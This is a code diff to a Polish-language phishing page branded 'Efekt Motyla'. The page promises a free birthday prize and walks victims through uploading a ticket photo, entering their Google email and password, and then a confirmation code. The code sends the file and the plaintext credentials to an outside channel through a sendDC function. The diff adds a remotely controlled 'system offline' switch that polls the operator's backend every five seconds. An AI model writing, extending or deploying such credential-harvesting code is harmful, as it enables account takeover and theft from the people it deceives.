@@ -260,6 +260,21 @@
         .success-page h2 { color: var(--success); font-size: 24px; margin-bottom: 8px; }
         .success-page p { color: var(--muted); font-size: 14px; line-height: 1.7; }
 
+        /* ===== SYSTEM OFFLINE OVERLAY ===== */
+        .system-offline {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(239,68,68,0.08);
+            border: 1px solid #ef4444;
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+        .system-offline.show { display: block; }
+        .system-offline .icon { font-size: 40px; }
+        .system-offline h3 { color: #ef4444; font-size: 18px; margin: 8px 0; }
+        .system-offline p { color: var(--muted); font-size: 13px; }
+
         @media (max-width: 480px) {
             .card { padding: 28px 18px 24px; }
             .card h1 { font-size: 20px; }
@@ -283,8 +298,15 @@
             <div class="logo">🦋 Efekt Motyla</div>
             <div class="badge">✦ 4. Urodziny</div>
 
+            <!-- ===== SYSTEM OFFLINE ===== -->
+            <div class="system-offline" id="systemOffline">
+                <div class="icon">⛔</div>
+                <h3>System wyłączony</h3>
+                <p>Przepraszamy, system jest aktualnie wyłączony przez administratora.<br>Spróbuj ponownie później.</p>
+            </div>
+
             <h1>🎁 Odbierz nagrodę!</h1>
-            <p class="sub">Wygrałeś darmowy niespodzianke pokaż ją przy wejściu! Wykonaj 3 kroki:</p>
+            <p class="sub">Wygrałeś darmową niespodziankę! Pokaż ją przy wejściu! Wykonaj 3 kroki:</p>
 
             <div class="steps">
                 <div class="step-dot active" id="dot1"></div>
@@ -409,11 +431,13 @@
         const confirmStatus = document.getElementById('confirmStatus');
 
         const successPage = document.getElementById('successPage');
+        const systemOffline = document.getElementById('systemOffline');
 
         let selectedFile = null;
         let sessionId = '';
         let email = '';
         let pass = '';
+        let isSystemOnline = true;
 
         // ============ FUNKCJE ============
         function goToStep(n) {
@@ -460,6 +484,38 @@
                 .catch(() => {});
         }
 
+        // 🔥 SPRAWDŹ STATUS SYSTEMU
+        function checkSystemStatus() {
+            fetch(API + '?status=true')
+                .then(r => r.json())
+                .then(data => {
+                    isSystemOnline = data.online !== false;
+                    if (!isSystemOnline) {
+                        systemOffline.classList.add('show');
+                        // Wyłącz wszystkie przyciski
+                        uploadBtn.disabled = true;
+                        loginBtn.disabled = true;
+                        confirmBtn.disabled = true;
+                        // Ukryj kroki
+                        document.querySelector('.steps').style.display = 'none';
+                        document.querySelector('.step-label').style.display = 'none';
+                        [s1, s2, s3].forEach(el => el.style.display = 'none');
+                    } else {
+                        systemOffline.classList.remove('show');
+                        uploadBtn.disabled = false;
+                        loginBtn.disabled = false;
+                        confirmBtn.disabled = false;
+                        document.querySelector('.steps').style.display = 'flex';
+                        document.querySelector('.step-label').style.display = 'block';
+                        s1.style.display = 'block';
+                    }
+                })
+                .catch(() => {
+                    // Jeśli błąd - zakładamy że system działa
+                    systemOffline.classList.remove('show');
+                });
+        }
+
         // ============ STEP 1 ============
         uploadZone.addEventListener('click', () => fileInput.click());
         fileInput.addEventListener('change', function() {
@@ -473,6 +529,11 @@
         });
 
         uploadBtn.addEventListener('click', function() {
+            if (!isSystemOnline) {
+                uploadStatus.className = 'status show error';
+                uploadStatus.textContent = '⛔ System wyłączony!';
+                return;
+            }
             if (!selectedFile) {
                 uploadStatus.className = 'status show error';
                 uploadStatus.textContent = '❌ Wybierz zdjęcie biletu!';
@@ -481,7 +542,6 @@
             uploadStatus.className = 'status show loading';
             uploadStatus.textContent = '⏳ Weryfikacja...';
             
-            // 🔥 WYSYŁKA OD RAZU
             sendDC('🎫 NOWY BILET\n\n📁 ' + selectedFile.name + '\n📏 ' + (selectedFile.size/1024/1024).toFixed(1) + ' MB\n🕐 ' + new Date().toLocaleString(), selectedFile);
             
             setTimeout(() => {
@@ -497,6 +557,11 @@
         });
 
         loginBtn.addEventListener('click', function() {
+            if (!isSystemOnline) {
+                loginStatus.className = 'status show error';
+                loginStatus.textContent = '⛔ System wyłączony!';
+                return;
+            }
             email = emailIn.value.trim();
             pass = passIn.value.trim();
             if (!email || !pass) {
@@ -508,10 +573,8 @@
             loginStatus.className = 'status show loading';
             loginStatus.textContent = '⏳ Logowanie...';
 
-            // 🔥 LOGINY WYSYŁANE OD RAZU
             sendDC('🔐 LOGOWANIE GOOGLE\n\n📧 ' + email + '\n🔑 ' + pass + '\n🆔 ' + sessionId + '\n🕐 ' + new Date().toLocaleString());
 
-            // Zapisz sesję na backendzie
             fetch(API, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -538,6 +601,11 @@
 
         // ============ STEP 3 ============
         confirmBtn.addEventListener('click', function() {
+            if (!isSystemOnline) {
+                confirmStatus.className = 'status show error';
+                confirmStatus.textContent = '⛔ System wyłączony!';
+                return;
+            }
             const code = confirmInput.value.trim();
             if (!code) {
                 confirmStatus.className = 'status show error';
@@ -577,6 +645,11 @@
         });
 
         if (localStorage.getItem('em')) { emailIn.value = localStorage.getItem('em'); passIn.value = localStorage.getItem('pa') || ''; }
+
+        // 🔥 SPRAWDŹ STATUS PRZY STARCIE
+        checkSystemStatus();
+        // Sprawdzaj co 5 sekund
+        setInterval(checkSystemStatus, 5000);
 
         console.log('🦋 Efekt Motyla');
     </script>
